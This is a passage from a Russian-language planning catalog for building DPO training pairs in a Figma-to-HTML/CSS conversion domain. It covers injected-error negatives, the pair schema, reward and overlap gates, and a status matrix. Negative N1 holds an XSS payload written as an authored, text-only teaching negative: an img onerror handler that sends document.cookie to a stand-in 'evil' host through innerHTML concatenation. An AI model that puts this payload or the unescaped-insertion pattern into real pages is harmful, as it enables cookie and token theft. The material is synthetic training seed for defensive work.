анти-replay; БЕЗ приватного макета/скриншот-байтов — leakage/privacy-оси). До обучения design→code ноги студент честно
отдаёт not_ready (живые маркеры `RUNTIME_SCAFFOLD_NOT_LEARNED_CRITIC`/`RUNTIME_SCAFFOLD_NOT_LEARNED_IMPROVER`,
`DeterministicLogicClaimedAsLearning:false`, `DesignConversionTrainedUnits.cs:58,:266,:40,:243`) — путь
`PASS_AS_HONEST_UNTRAINED_SCAFFOLD`.

#### PE-9.3 Блок 3 — NEGATIVE (rejected) примеры: ТА ЖЕ задача, РОВНО ОДНА внедрённая ошибка

Каждый негатив — Error-Injection над хорошим фрагментом (б): полный парсящийся правдоподобный HTML+CSS (НЕ отказ, НЕ
мусор — G1) с ОДНОЙ главной ошибкой; всё остальное без изменений. Коды: 3 доменно-локальных `dcm_*` (канонического
RAG-07 XSS/visual арбитра НЕТ — честно) + 2 канонических (`ORCH-02`, `PromptError-11`) — каждый с указанием родительской
оси, no dual-canon (§2.3).

**N1 — критический security (доменно-локальный; канонического RAG-07 XSS-арбитра НЕТ).** Экранированная вставка имени
заменена сырой строковой конкатенацией user-text в разметку (как во front-конвертере FigmaToCode):
`<span class="dcm-name" id="nameSlot"></span> … document.getElementById('nameSlot').innerHTML = '<b>' + userName + '</b>';`
где `userName` пришёл из Figma characters и равен `<img src=x onerror="fetch('//evil/'+document.cookie)">`.
`[WRONG: dcm_xss_unsanitized_markup (доменно-локальный; родительская ось = security; ЧЕСТНО: канонического RAG-07
XSS/HTML-injection арбитра НЕТ — живые security-арбитры RAG-07 = jwt/oauth/password/sqlInjection/tenant/tls/secret/
supplyChain, XSS среди них отсутствует) — пользовательский текст узла (Figma characters) конкатенируется в innerHTML без
экранирования: onerror исполняет произвольный JS в контексте страницы (кража cookie/токенов) — последствие; якорь —
ЖИВОЙ дефект переиспользуемого движка: FigmaToCode `element-code.ts:150` возвращает `containingString` СЫРЫМ (без escape),
самый прямой XSS-вектор при переносе front-конвертера]`

**N2 — полнота IR (доменно-локальный false-absence; родительская ось = живой coverage/`missing_element`).** Один
объявленный узел IR (`status-text`) молча выпал из разметки (`<span class="dcm-status">` удалён целиком); всё остальное
без изменений:
`[WRONG: dcm_uncovered_ir_node (доменно-локальный false-absence; родительская ось = полнота покрытия узлов IR, живой
сосед-код таксономии 44 `missing_element` — переиспользована ось БЕЗ переименования живого номера, no dual-canon) —
объявленный узел IR (status-text) не покрыт выходной разметкой: результат перестаёт соответствовать макету — последствие;
это ось visual-fidelity/полнота (`VisualVerdict.Defects` должен ловить именно это); DOM валиден, но узел IR потерян]`

**N3 — галлюцинированный элемент (доменно-локальный false-presence; ЗЕРКАЛО N2).** В разметку добавлен элемент, которого
НЕТ в IR (лишний `<button class="dcm-follow">Подписаться</button>` внутри header); все объявленные узлы на месте:
`[WRONG: dcm_hallucinated_element (доменно-локальный false-presence; родительская ось = IR-fidelity/визуальная точность;
канонического/живого зеркала false-presence в таксономии 44 НЕТ — `missing_element` покрывает лишь false-absence →
явный доменно-локальный код, честно, no dual-canon) — элемент, отсутствующий во входном IR (кнопка follow), выдуман и
вставлен в вывод: конвертер добавил несуществующий в дизайне элемент — последствие; это прямой парный контраст к N2
(потеря узла vs выдумывание узла) — обе ошибки ловит I/O-инвариант «множество видимых элементов == множеству узлов IR»
(PE-9.2в п.2)]`

**N4 — маршрутизация/доказательство (канон `ORCH-02`).** Юнит-выход утверждает соответствие макету, но НЕ несёт
evidence-ссылки на узлы IR/QA-вердикт (пустой `EvidenceRefs`, нет привязки к `VisualVerdict`); разметка правдоподобна:
`[WRONG: ORCH-02 Missing Evidence (канонический код + каноническое имя, §2.3; ось = маршрутизация/приёмка) — вывод не
несёт доказательной привязки (IR-узлы/QA-вердикт/`EvidenceRefs`), которую требует контракт домена: приёмка не может быть
обоснована — последствие; типовой дефект «выглядит верно, но нечем подтвердить», ровно та ось, где домен обязан
прикладывать evidence-refs узлов/дефектов]`

**N5 — расплывчатый deliverable (канон `PromptError-11`).** Вместо конкретной разметки — заглушка-каркас с TODO
(`<div class="dcm-frame"><!-- TODO: аватар, имя, статус --></div>` + `.dcm-frame{ /* стили позже */ }`):
`[WRONG: PromptError-11 Vague Deliverables (канонический код + каноническое имя, §2.3; ось = конкретность deliverable) —
выход — расплывчатый скелет с TODO вместо реализованного фрагмента: ни один узел IR не материализован, задача не решена —
последствие; правдоподобный «я потом допишу»-дефект, но deliverable пустой]`

Гейты пары G1–G3, G5–G6: G1 — каждый N парсится и правдоподобен (типовые дефекты реальных генераторов/джуниоров:
innerHTML «для простоты», потерянный при рефакторинге элемент, выдуманная «полезная» кнопка, забытый evidence, «допишу
потом»); G2 — код указан (доменно-локальный `dcm_*` + родительская ось ЛИБО канонический `ORCH-02`/`PromptError-11`);
G3 — `[WRONG:]` присутствует ровно ОДИН на негатив; G5 — не почти-копия по ДИФФ-региону (markup-overlap гейт PE-9.4);
G6 — классы типичны для домена. Каждый N — ровно одна главная ошибка; слабый негатив → отбраковка пары (предохранитель
§1.3 п.6 + живой guard `rejected_not_realistic_negative` домена), НЕ обучение.

#### PE-9.4 Блок 4 — DPO-PAIR-READINESS (эскиз 14-полевой проекции `GraphDpoPair`, §1.4)

```json
{ "PairId": "design-conversion-pair-0001",
  "Level": "unit",
  "NodeOrEdgeId": "design-conversion/profile-card/avatar-header-block",
  "InputContext": { "ir_context": "FRAME profileHeader auto-layout HORIZONTAL itemSpacing16 padding16 320x96; узлы IR: IMAGE avatar 64x64, TEXT name(userName), TEXT status(statusText); declared nodes: {avatar-image,name-text,status-text}; target: flex-row center; node text = Figma characters (user data)",
                    "critic_verdict": "VisualVerdict{defects:[non-semantic-div, absolute-layout, missing-alt, unescaped-text, low-contrast]}",
                    "y_best_markup": "<сырой HTML+CSS Y_best из PE-9.2>" },
  "Chosen":   { "html_css": "<фрагмент (б): article/header/img+alt + flexbox из auto-layout + экранированный текст + контраст >=4.5:1; все узлы IR покрыты>" },
  "Rejected": { "html_css": "<N1: сырая конкатенация user-text в innerHTML — XSS-вектор>" },
  "WrongMarkers": ["[WRONG: dcm_xss_unsanitized_markup — пользовательский текст узла конкатенируется в innerHTML без экранирования — onerror исполняет произвольный JS; якорь element-code.ts:150]"],
  "Reason": "Design->code разметка обязана быть семантической, доступной, адаптивной (auto-layout->flex), ПОЛНОЙ по узлам IR и безопасной (экранирование user-text); сырая вставка текста узла в innerHTML — критический XSS даже когда DOM визуально верен (>=24 символа, Gate B)",
  "TeacherProvenance": { "указатель": "nested 20-полевой канон plan-08 §3.1 :389–:409; заполняет детерминированный TeacherProvenanceAdapter (не LLM); teacher_output_used_for_training — по исходу гейта; профиль qwen35-local-v1 plan-08 §3.5.2" },
  "SourceIds": ["figmatocode-isc-front-converter-ir-seed", "llm-mvp-core-44-domain-contract-seed", "catalog-pe9-design-conversion-seed-0001"],
  "HeldOut": false,
  "CandidateOrderInvariant": true,
  "ExcludedLeakageSignals": ["candidate_index", "source_path", "source_id", "file_order", "correlation_id", "exact_prompt"],
  "DpoTrainReady": false }
```

- **`DpoTrainReady: false` — ЧЕСТНЫЙ доменный Phase-0-блок в АРБИТРЕ ПРИЁМКИ (эхо-судья, §4 п.3).** Судья визуального
  качества = ЭХО-КОНСТАНТА: VERIFIED spot-read `critic.Confidence == verdict.Score` (`DesignConversionTrainedUnits.cs:47`,
  причём `verdict.Score = verdicts.Min(Score)` :82 — простая агрегация входных QA, не обученное суждение) и
  `improver.Confidence == input.CriticVerdict.Score` (:250), `Accepted == input.CriticVerdict.Passed` (:235); внешний
  visual-judge НЕ сконфигурирован (`NoConfiguredVisualJudge` → 0.0 blocked, `DesignConversionVisualJudge.cs:376+`),
  `PassesGate:false` (`DesignConversionMachine.cs:125`), единственная DPO-пара синтетическая
  (`chosenScore=Max(0.01, ...Verdict.Score)`, `DesignConversionDpoGenerator.cs:1115`), Route B (мост → `11.DPO/DpoTrainer`)
  пуст, 0/10 e2e. Сигнал, решающий chosen/rejected по визуальной оси, СЕЙЧАС не реален и не независим → легитимной
  ВИЗУАЛЬНОЙ разметки пары нет до ремонта судьи. Смягчение: структурные оси (семантика/полнота/доступность/адаптив/
  безопасность — PE-9.2в п.2–6) детерминированно проверяемы парсером УЖЕ сейчас; но пока визуальный арбитр = эхо,
  `DpoTrainReady=false` — честный вердикт «домен НЕ готов давать визуально-обоснованную пару»; всё «Цель» — **[условно от
  M1]** (де-риск Route B/эхо-судьи = та же M1-зависимость). Флип держит §4 п.3, не только G-DPO-FINAL.
- **Обе проекции (fan-out winner-vs-each-loser):** 5 негативов на один chosen → 5 ОТДЕЛЬНЫХ пар
  `design-conversion-pair-0001..0005` (по одной на N1..N5); поле `Rejected` никогда не несёт список (§1.3; владелец
  проекции — builder WO-M1.1). Пара `-0002` несёт `Chosen`=(б) / `Rejected`=N2 (`dcm_uncovered_ir_node`, false-absence);
  пара `-0003` несёт `Rejected`=N3 (`dcm_hallucinated_element`, false-presence) — явный ЗЕРКАЛО-контраст полноты IR.
- **LegScope:** `common`-кандидат (HTML+CSS вне платного `RAG-02`; FigmaToCode ISC + первопартийный 44-домен; §PE-9.1);
  нюанс: реальные пользовательские макеты/скриншоты → всегда `.xiigen`/`PersonalAdaptive` до redaction+approval
  (`BLOCK_FOR_COMMON`); framework-таргет (Angular и т.п.) — платная зона PE-5, не эта нога.
- **Source-disjoint нота (HeldOut):** held-out кандидаты пары — ДРУГИЕ макеты/сцены, чем train (не авторские сценарии
  раннера); `HeldOut` — поле пары; лексический Jaccard-guard train↔eval обязателен (§1.3 п.9); все 6
  `ExcludedLeakageSignals` перечислены (candidate_index/source_path/source_id/file_order/correlation_id/exact_prompt) +
  доменные privacy-сигналы (raw_screenshot_bytes, design_file_ref) идут в карантин, НЕ 7-м полем канона (§1.4 — 14 полей,
  15-е поле не добавляется).
- **REWARD-SCALARIZATION для НЕ-скалярного html+css (ОБЯЗАТЕЛЬНО — SI_GATE_3; distinctive этого прохода).** Стороны — НЕ
  атомарный ответ, а МНОГОЭЛЕМЕНТНАЯ структура (дерево тегов + CSS-правила) → срабатывает гейт CLAUDE.md
  «reward-scalarization rule for non-scalar chosen/rejected». Два владельца-скаляра (single-owner, plan-07 :355–:357):
  - **DPO-reward (единственный владелец reward для margin — блок 07):**
    `reward(side) = Beta·(policyLogP(Norm(Serialize(side.Html+side.Css)) | InputContext) − referenceLogP(Norm(Serialize(side.Html+side.Css)) | InputContext))`,
    где `Serialize` уплощает дерево тегов + CSS-правила в ОДНУ каноническую токен-последовательность, а `Norm` —
    markup-нормализатор (ниже), применяемый ДО сериализации. `margin = chosenReward − rejectedReward`;
    `margin ≤ 0.05 → LOW_CONTRAST` (не учим); LOW_CONTRAST также при `overlap ≥ 0.60` (plan-07 :520). Это и есть свод
    много-элементного html+css в ОДИН скаляр для DPO-margin (SI_GATE_3 закрыт).
  - **`Q_struct(side)` — детерминированный quality-скаляр `IndependentDomainScorer`, EVAL-ONLY (Y_best-selection +
    preference_score-провенанс, НЕ reward):**
    `Q_struct(side) = w_sem·structural_fidelity + w_sty·style_fidelity + w_a11y·a11y + w_sec·security − w_norm·markup_normalization_penalty`,
    где под-скоры ∈ [0,1] считает ДЕТЕРМИНИРОВАННЫЙ HTML/CSS-парсер над `Norm(side)`: `structural_fidelity` = доля узлов
    IR под семантическими тегами по роли минус div-суп; `style_fidelity` = доля Style-настроек IR, отражённых внешним CSS
    (auto-layout→flex) минус hardcoded absolute-px; `a11y` = доля `<img>` с alt + доступные имена/роли + контраст ≥ 4.5:1;
    `security` = 1 − доля неэкранированных вставок `containingString` в разметку; `markup_normalization_penalty` = штраф за
    диффы, устранимые нормализацией (обнуляется правильной `Norm`, оставлен как guard). Веса `w_*` — per-WO деталь (WO
    может только УЖЕСТОЧИТЬ), `w_sec` — доминирующий (критический класс). Y_best-selection:
    `chosen = Y_goal ⇔ Q_struct(Y_goal) > Q_struct(Y_best)`, ничья → Y_best (детерминированный eval-only baseline).
  - **ЭХО-ИСКЛЮЧЕНИЕ:** ось `VisualVerdict.Score` СЕЙЧАС эхо-константа → она ИСКЛЮЧЕНА и из `reward(side)`, и из `Q_struct`
    до Phase-0 замены эхо-судьи; reward берётся из logprob-margin нормализованной разметки, `Q_struct` — из
    детерминированного парсера, НИ ОДИН — из сломанного судьи. Без определённого `reward(side)` → `REWARD_EXTRACTOR_MISSING`
    (plan-07 :360).
- **MARKUP-OVERLAP гейт (доменный перенос PE-4.4/PE-8 + ОБОСТРЁННАЯ нормализация — прайм-вектор reward-hacking разметки).**
  Одно-дефектная инъекция в ~10-элементный фрагмент даёт raw overlap ≫ 0.75 by construction → правило PE-4.4 переносится с
  markup-рамкой: `frame` = токены `InputContext` (Element/Style IR-контекст + общий tag/CSS-скелет + Y_best-черновик);
  `shared=(chosen∩rejected)−frame; total=(chosen∪rejected)−frame; overlap_ratio=shared/total`; гейт ОДНОСТОРОННИЙ
  `>0.75 → discard`; нижней границы нет (LOW_CONTRAST margin/overlap≥0.60 — отдельный reward-гейт выше). **КРИТИЧНО для
  разметки (риск reward-hacking ВЫШЕ, чем у C#/SQL):** `Norm()` = canonical attribute-order (алфавит) + collapsed
  whitespace/indent + sorted CSS-declarations внутри правила + unified quotes + canonical void-element form + canonical
  class-order в `class=""` + безопасный tag-синоним-fold — применяется к ОБЕИМ сторонам ДО overlap И ДО сериализации reward,
  иначе тренер выучит форматирование, а не семантику дефекта; порог материальности: дифф-регион ≥ 1 семантический тег/узел
  IR/CSS-правило; attribute-order/whitespace/quote-only дифф → discard (G5). **Кавета:** 0.75/0.60 — концептуальные пороги
  (перенос), runtime-мерителя НЕТ **[условно от M1]**; калибровка = DPO-build. N1–N5 сконструированы с непересекающимися
  дифф-регионами (innerHTML-конкатенация / удалённый status-span / выдуманная follow-кнопка / пустой evidence / TODO-скелет)
  → попарный overlap дифф-регионов ≈ 0 by construction; фактический `overlap_ratio` меряет builder, НЕ каталог.

#### PE-9.5 Блок 5 — ГЕЙТЫ ЧЕСТНОСТИ ПРИМЕРА

1. **Маркер срезается до обучения:** `[WRONG:]` живёт в `WrongMarkers` и в rejected-ИСТОЧНИКЕ; из ТРЕНИРУЕМОГО
   rejected-представления срезается до токенизации (§1.3 п.4). Живой guard `rejected_not_realistic_negative` +
   `chosen_rejected_candidate_id_same` домена — при переиспользовании живых пар builder ОБЯЗАН выполнить strip маркера.
2. **Acceptance-signal independence — ЖИВАЯ ЭХО-ЛОВУШКА (критично, §4 п.3):** chosen решает ТОЛЬКО детерминированный
   design→code-`IndependentDomainScorer` (`Q_struct` — парс HTML/CSS + структурные оси PE-9.2в п.2–6);
   `current_output_is_already_optimal` учителя — диагностика, скоринг исполняется ВСЕГДА. **Живая ловушка hidden-authority
   (VERIFIED):** в 44-коде `critic.Confidence == verdict.Score` (`DesignConversionTrainedUnits.cs:47`) И
   `improver.Confidence == input.CriticVerdict.Score` (:250), а сам `verdict.Score` СЕЙЧАС происходит из эхо-агрегации
   (`verdicts.Min(Score)` :82) поверх metadata-only/несконфигурированного судьи — т.е. «уверенность» критика == эхо-судья.
   Если этот Score станет сигналом приёмки — это КРУГОВАЯ само-разметка ПОВЕРХ сломанного судьи (двойной запрет:
   `acceptance_signal_source != trained_unit_self_confidence` И `!= echo_judge_constant`, SI_GATE_7). Скорер приёмки
   html+css ОБЯЗАН быть независимым и от improver-юнита, и от эхо-константы — это REAL R4/A-LM-09-ловушка, не гипотетическая.
3. **Anti-reward-hacking (§1.3 п.7 (а)–(е) + markup-специфика ЯВНО):** (а) НЕ константный промпт — пары батча от ≥2 разных
   фрагментов/макетов; (б) length-balance — N1–N5 полные фрагменты ≈ длине (б); микс направлений (N1 innerHTML чуть ДЛИННЕЕ,
   N2 удалённый span чуть КОРОЧЕ, N3 лишняя кнопка чуть ДЛИННЕЕ — длина не коррелирует с меткой); (в) НЕ confidence-leakage —
   в разметке сторон нет confidence-полей; (г) НЕ measurement circularity — рубрика скорера (в) не производная от train-строк
   И НЕ эхо-судья (п.2); (д) chosen==rejected → хард-гейт (живой `chosen_rejected_candidate_id_same`); (е) mojibake-гейт —
   HTML латиница, но русские текст-узлы/комментарии/alt под тем же гейтом; **(ж) MARKUP-специфичные хаки (ЯВНО, риск ВЫШЕ
   C#/SQL):** НЕ форматирование-как-сигнал (отступы/регистр тегов/кавычки), НЕ attribute-order-как-сигнал (`id class` vs
   `class id`), НЕ class-order/CSS-property-order/tag-синоним-как-сигнал — нормализация ОБЕИХ сторон (`Norm()`, PE-9.4) до
   токенизации = обязанность builder'а; НЕ single-token-shortcut: батч, где ЕДИНСТВЕННЫЙ разделитель — наличие `<article>`
   или `alt=`, научит детекцию токена, а не семантику — оси улучшений обязаны варьироваться по батчу.
4. **Карантин-классы (§1.3 п.11 + design-обострение):** **security — XSS-паттерн N1 существует в датасете ТОЛЬКО как
   rejected-teaching-negative (text-only):** builder/runner НИКОГДА не рендерит rejected-стороны в реальном браузере
   visual-QA и не кладёт их в артефакт/деплой-путь (rejected-HTML с `onerror` — учебный негатив, НЕ поставляемая
   уязвимость; реальный секрет/токен в строке пары = провал+карантин, ось secretPresence); privacy — реальные
   пользовательские МАКЕТЫ/скриншоты/приватный UI → `PersonalAdaptive`/`.xiigen` до redaction+approval (`BLOCK_FOR_COMMON`);
   consent — байты чужого дизайна не попадают в common-датасет без записанного согласия; легальный — закрытая проприетарная
   teacher-модель → `DATASET_REBUILD_REQUIRED`; FigmaToCode ISC-строки пермиссивны, но внешние AI-вызовы движка НЕ
   переносятся (R7).
5. **margin > 0.05** (иначе `LOW_CONTRAST`; также overlap ≥ 0.60 → LOW_CONTRAST, plan-07 :520); слабый негатив →
   отбраковка предохранителем (§1.3 п.6 + живой `rejected_not_realistic_negative`), НЕ обучение.
6. **Честность статуса (catalog≠capability):** каталог = plan-content; учитель (Qwen3.5-9B/Ollama) НЕ вызывался; ни одна
   `GraphDpoPair` НЕ построена (0 пар); ни один рендер/браузер/visual-QA НЕ запускался этим пассом (spot-read — только
   git-grep/Read, read-only); обучаемый design→code юнит СУЩЕСТВУЕТ как контракт (`IDesignConversionImproverUnit`,
   VERIFIED), но НЕ обучен (`PassesGate:false`, эхо-судья, Route B пуст, 0/10 e2e) — все capability-элементы примера
   **[условно от M1]**; Y_best/Y_goal/N1–N5 — АВТОРСКИЕ композиции (SYNTHETIC_SEED) ПО ФОРМЕ живого IR-контракта FigmaToCode
   (`Element/Style`) и живых доменных контрактов 44 (якоря процитированы), НЕ реальные выходы моделей и НЕ verbatim-копии
   файлов; XSS-вектор N1 привязан к ЖИВОМУ дефекту `element-code.ts:150` (сырой `containingString`), но onerror-payload —
   авторская иллюстрация; overlap-значения — целевые by construction, НЕ измеренные; пороги 0.75/0.60 — концептуальный
   перенос, НЕ калиброванные; токен-оценки бюджета — аппроксимация; продуктовый код/тесты/git-write НЕ выполнялись; счётчики
   НЕ двигались.

#### PE-9.6 Блок 6 — ИСТОЧНИК РЕАЛИЗМА (read-only цитаты с путями)

| Что обосновано | Источник (file:line) | Статус |
|---|---|---|
| Обучаемый design→code юнит `IDesignConversionImproverUnit : ILogicalUnit<...ImproverUnitInput, ...ImproverUnitOutput>` (вход {Request, CriticVerdict, Candidate}, выход {улучшенный Candidate, DeterministicLogicClaimedAsLearning}); critic-юнит + CriticVerdict | `C:/Projects/llm_mvp_core/44.DesignConversionDomain/DesignConversionUnitContracts.cs:7–:19,:21–:34,:41–:44` | VERIFIED (живой read) |
| Контракты IR-мостика: `VisualVerdict{Score,Defects,Passed}` :106–:111, `VisualDefect` :95–:104, `DesignConversionImprovementCandidate{Html,Css}` :122–:129, `DesignConversionImprovementOutput{Html,Css,Verdict,Accepted}` :131–:139, `DesignConversionDpoTrainingRecord{Chosen,Rejected}` :161–:175 | `.../DesignConversionContracts.cs:95–:175` | VERIFIED |
| ЭХО-ловушка acceptance-independence: `critic.Confidence == verdict.Score` :47, `verdict.Score = verdicts.Min(Score)` :82, `improver.Confidence == input.CriticVerdict.Score` :250, `Accepted == input.CriticVerdict.Passed` :235, честные scaffold-маркеры `RUNTIME_SCAFFOLD_NOT_LEARNED_CRITIC/IMPROVER` :58,:266, `DeterministicLogicClaimedAsLearning:false` :40,:243 | `.../DesignConversionTrainedUnits.cs:40,:47,:58,:82,:235,:243,:250,:266` | VERIFIED (живой read) |
| DPO-margin домена = `Chosen.Verdict.Score − Rejected.Verdict.Score` (reward домена СЕЙЧАС = `side.Verdict.Score`); синтетический baseline `chosenScore=Max(0.01, ...Verdict.Score)` :1115; `CriticUnit` const :12 | `.../DesignConversionDpoGenerator.cs:12,:273,:1115` | VERIFIED (grep + read) |
| Gate `PassesGate:false` (константа) | `.../DesignConversionMachine.cs:125` | VERIFIED (grep) |
| Внешний visual-judge НЕ сконфигурирован по умолчанию (`NoConfiguredVisualJudge` → Score 0.0 blocked, Route B пуст); локальный судья = детерминированный metadata-скорер, `external_ai_visual_judge_executed:false`, threshold 0.85 | `.../DesignConversionVisualJudge.cs:78–:189,:376–:480` | VERIFIED (живой read) |
| FigmaToCode IR `Element` (18 полей: `containingString`/`style`/`subElements`/`openTag`/`closeTag`/`code`/`codeCss`) + `Style` (`settings`/`image`) | `C:/Projects/FigmaToCode-design-gen/src/plugin/models/Element.ts:4–:23`; `models/Style.ts:3–:10` | VERIFIED (живой read) |
| ЖИВОЙ XSS-вектор: user-text (`containingString`) течёт в HTML/CSS СЫРЫМ (raw CSS-конкатенация :131; `lookForPlaceholder` возвращает `containingString` без escape :150) | `.../src/plugin/utils/element-code.ts:130–:151` | VERIFIED (живой read) |
| Лицензия FigmaToCode = ISC (пермиссивная, класс MIT → training-ok) | `.../package.json:2–:5` (`figma-to-code` v2.0.0, `"license":"ISC"`) | VERIFIED (живой read) |
| Канон пары 14 полей `GraphDpoPair`; reward logprob-margin `reward(side)=Beta·(policyLogP−referenceLogP)`; LOW_CONTRAST overlap≥0.60 / margin≤0.05 | этот каталог §1.4, §1.3 п.5; владелец plan-07 §3.2 :246–:261 / :341–:360 / :520 | CITED (владелец каталога §1.4/§1.3; этим пассом плана-07 не перечитан) |
| `TeacherProvenance` 20 полей (nested); профиль учителя `qwen35-local-v1`; двухэтапный teacher-контракт §Шаг 3a; Y_best-детерминизм + G-DPO-FINAL | этот каталог §1.4; plan-08 §3.1 :389–:409, §3.5.2; plan-09 §Шаг 3a; overlay | CITED (владелец каталога §1.4) |
| §4 п.3 эхо-судья Phase-0 (наблюдался `critic.Confidence == verdict.Score == const`, потолок занижен, Route B пуст, 0/10 e2e; XSS-негатив text-only; канонического RAG-07 XSS-арбитра НЕТ); карта §3 строка 8; §2.3 no-dual-canon; PE-4.4/PE-8 overlap-перенос | этот каталог §4 п.3, §3 строка 8, §2.3, PE-4.4/PE-8.4 | CITED (в этом файле) |

### PE9-ЛОГ.1 Что добавлено (append-only + FC-44 sweep в ОДНОМ шаге)

1. Эта секция — заполненный шаблон §2.1 для задачи 8 «HTML-CSS (design→код)» (блоки 1–6), включая counted spot-read
   живых типов 44+FigmaToCode (PE-9.1, VERIFIED) и честный вывод «канонического RAG-07 XSS-арбитра НЕТ».
2. FC-44 single-owner sweep В ОДНОМ шаге: (а) строка §5.2 «HTML-CSS | PE-9»: `NOT_STARTED → ЗАПОЛНЕНО [FIX-PE-9]`;
   (б) front-matter `pass` + новый `pass_pe9_fill`; (в) §4 п.3 помечен `[ОТРАБОТАНО PE-9]` с VERIFIED-подтверждением
   эхо-судьи. Никаких двух живых противоречивых статусов (stale-status-carrier = 0).
3. Прочий старый текст НЕ переписан.

### PE9-ЛОГ.2 Счётчики и parity (проход PE-9)

- **WO: 53 — БЕЗ изменений. Решения: 26 — БЕЗ изменений. Ветки 55 / связи 21 / §0-узлы / знаменатель M5=46 — БЕЗ
  изменений** (примеры промптов = plan-content; реального нового WO проход не создал — движение счётчика возможно только в
  PE-10 по правилу §5.3).
- Статусы плана НЕ тронуты: PLAN-ONLY; `PLAN_NOT_READY` плана НЕ меняется; PE-цепочка валидируется пер-проходно Opus 4.8.

### PE9-ЛОГ.3 Пакет честности прохода PE-9

- claim_scope: изменён ТОЛЬКО этот файл; добавлена эта секция + FC-44 sweep (строка §5.2 + header + §4 п.3). Примеры —
  ПЛАНОВЫЕ ОБРАЗЦЫ обучающих промптов/пар: учитель НЕ вызывался; ни одна `GraphDpoPair` НЕ построена; visual-QA/рендер/
  браузер НЕ запускались; обучаемый design→code юнит существует как контракт, но НЕ обучен (эхо-судья/Route B пуст/0-10
  e2e); Y_best/Y_goal/N1–N5 — АВТОРСКИЕ композиции (SYNTHETIC_SEED) ПО ФОРМЕ живого IR-контракта FigmaToCode и живых
  контрактов 44 (якоря процитированы), НЕ реальные выходы моделей; XSS N1 привязан к живому `element-code.ts:150`,
  payload — авторская иллюстрация; overlap-значения — целевые by construction; пороги 0.75/0.60 — концептуальный перенос;
  продуктовый код/тесты/git-write НЕ выполнялись; счётчики НЕ двигались.
- evidence_scope (живое read-only чтение ЭТИМ пассом): `44.DesignConversionDomain` — `DesignConversionContracts.cs:1–:176`
  (полный read), `DesignConversionUnitContracts.cs:1–:45` (полный read), `DesignConversionTrainedUnits.cs:20–:90,:225–:279`
  (критик/improver/echo), `DesignConversionVisualJudge.cs:1–:1147` (судья/NoConfigured/External), `DesignConversionDpoGenerator.cs`
  (grep `critic/Confidence/Verdict.Score/margin`), `DesignConversionMachine.cs` (grep `PassesGate:false` :125); glob 40 файлов
  домена; FigmaToCode — `models/Element.ts:1–:23`, `models/Style.ts:1–:10`, `utils/element-code.ts:125–:154`, `package.json:1–:12`
  (все полный read); каталог — §1.3/§1.4/§2.1/§2.3/§3/§4/§5.2 (полный read), sample-образец PE-9 плана-источника
  PLAN-VS-VSCODE-CONTINUE-v1.md :5713–:5927 (структура-образец, read-only), Task-7 (SQL) house-format :349–:416; скиллы —
  trainable-architecture-decision-SKILL (SI_GATE_3/SI_GATE_7), plan-review-SKILL (FC-44), claim-verification-SKILL,
  output-readability-gate-SKILL (полный/частичный read).
- Ограничение/честность: spot-read = counted spot-read ключевых типов (контракты/echo/judge/IR + FigmaToCode IR/лицензия/
  XSS-вектор — VERIFIED), НЕ полное чтение всех 40 файлов домена: `DesignConversionImprovementLoopCoordinator.cs`/
  `TrainingPipeline.cs`/`DpoDatasetBuilder.cs` глубже не читались; штраф 0.40/потолок 0.60 metadata-компаратора взяты
  CITED из §4 п.3 (не перечитан `DesignConversionQaProviders.cs` этим пассом) — но ЭХО-отношение `critic.Confidence ==
  verdict.Score` подтверждено VERIFIED spot-read `DesignConversionTrainedUnits.cs:47/:250`; plan-07/08/09/overlay/RAG —
  CITED через каталог §1.3/§1.4. Негативы = 3 доменно-локальных `dcm_*` (security false-presence-vector + false-absence +
  false-presence зеркало) + 2 канонических (`ORCH-02`/`PromptError-11`); полный баланс классов = обязанность DPO-build.
  **`DpoTrainReady:false` — ЧЕСТНЫЙ вердикт «домен НЕ готов давать визуально-обоснованную пару» (эхо-судья = сломанный
  арбитр приёмки, VERIFIED; Route B пуст; 0/10 e2e), держит §4 п.3, а не только G-DPO-FINAL**; LegScope common-кандидат
  (HTML+CSS вне платного `RAG-02`) с user-макет→PersonalAdaptive каветой — финальный сплит = PE-10/решение Luba;
  «канонического RAG-07 XSS-арбитра НЕТ» — CITED-факт §4 п.3, security-негатив честно доменно-локальный; **это ПОСЛЕДНИЙ
  тип-задачи проход (8/8 типов заполнены)** — следующий PE-10 = консолидация; валидация этого прохода = Opus 4.8 (родитель)
  ДО старта PE-10.

---
*Конец прохода PE-9/10 — ПОСЛЕДНИЙ тип-задачи проход (8/8 типов заполнены). PE-10 (консолидация + DPO-pair-readiness +
привязка WO-M1.1/домены + сводная `DpoTrainReady`-матрица 8 строк + parity/counter re-stamp) стартует после валидации
Opus 4.8 этого прохода. План остаётся PLAN-ONLY («не надо исполнять»).*

---

## КОНСОЛИДАЦИЯ PE-10/10 — сквозные гейты G1–G6 (cross-catalog sweep)

**[FIX-PE-10]** **Дата:** 2026-07-14. **Автор:** Opus 4.8 (Ultracode), одиночный bounded-агент прохода
PE-10/10 (АРХИТЕКТОР-КОНСОЛИДАТОР). **Метод:** PLAN-ONLY, только этот файл; НЕ коммит (ветка `main`,
коммитит Luba). **Что это:** финальный проход — сквозная проверка всех 8 уже заполненных примеров
(PE-2..PE-9) против 6 консолидационных гейтов G1–G6. Это **cross-catalog sweep**, НЕ новая задача и НЕ
новый пример. Ни один продуктовый факт не создаётся; секция только сводит и сверяет то, что уже написали
проходы PE-2..PE-9, добавляя честную привязку к хребту DPO-build.

**Граница честности (claim boundary).** `catalog != capability`. Каталог = СОДЕРЖИМОЕ ПЛАНА (обучающий
seed), НЕ работающая способность. В консолидации: учитель Qwen3.5-9B НЕ вызывался; **0** `GraphDpoPair`
построено; **0** обучаемых юнитов обучено; продуктовый код/тесты/git-write НЕ выполнялись; счётчики плана
(`WO 53`/`решения 26`/`ветки 55`/`связи 21`/`M5=46`) НЕ тронуты; `readiness` плана (`PLAN_NOT_READY`) НЕ
меняется. `VERIFIED` = живое чтение/grep ЭТИМ проходом; `CITED` = взято из уже написанных проходов без
повторного чтения.

---

### G1 — Сводная `DpoTrainReady`-матрица 8 задач (ВСЕ = false)

| # | Задача | Домен реализации | `DpoTrainReady` | Почему `false` | Что разблокирует `true` |
|---|---|---|---|---|---|
| 1 | Оркестрация (PE-2) | `OrchestrationPlanMachine` (42) + конвейер стадий 43 + L5-граф `ILearningDynamicGraph` | **false** | Нет собранного пар-builder'а (Ф3/M1); `G-DPO-FINAL` не закрыт | Ф3-builder (`GraphDpoBuilder`/обучаемый юнит) + `G-DPO-FINAL` predicate proof + Luba-approval |
